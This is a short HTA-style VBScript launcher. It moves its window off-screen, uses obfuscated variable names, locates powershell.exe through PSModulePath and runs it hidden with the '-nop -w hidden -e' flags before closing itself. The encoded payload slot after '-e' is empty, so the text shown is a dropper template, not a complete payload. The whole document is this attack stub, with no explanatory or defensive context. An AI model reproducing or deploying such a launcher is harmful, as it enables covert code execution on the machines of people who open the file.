<script language="VBScript">
  window.moveTo -4000, -4000
  Set kIv = CreateObject("Wscript.Shell")
  Set t21v6Krk = CreateObject("Scripting.FileSystemObject")
  For each path in Split(kIv.ExpandEnvironmentStrings("%PSModulePath%"),";")
    If t21v6Krk.FileExists(path + "\..\powershell.exe") Then
      kIv.Run "powershell.exe -nop -w hidden -e ",0
      Exit For
    End If
  Next
  window.close()
</script>
